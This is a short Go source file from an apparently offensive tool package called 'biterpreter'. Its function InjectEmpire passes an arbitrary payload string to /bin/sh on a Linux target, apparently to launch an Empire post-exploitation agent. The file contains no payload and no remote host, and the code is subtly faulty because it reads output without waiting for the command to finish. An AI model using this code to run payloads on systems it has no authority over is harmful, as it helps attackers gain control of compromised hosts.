// +build linux


package biterpreter

import (
	
	"os/exec"	// requirement to execute commands against target system
	"bytes"
)


func InjectEmpire(payload string) (bool,string){
	
	var outbuf, errbuf bytes.Buffer
	cmd_path := "/bin/sh"
	cmd := exec.Command(cmd_path, "-c",payload)
	cmd.Stdout = &outbuf
	cmd.Stderr = &errbuf
	cmd.Start()
	stdout := outbuf.String()
	stderr := errbuf.String()
	if stderr != ""{
		return true,stderr+stdout
	}

	return false,stdout+stderr
}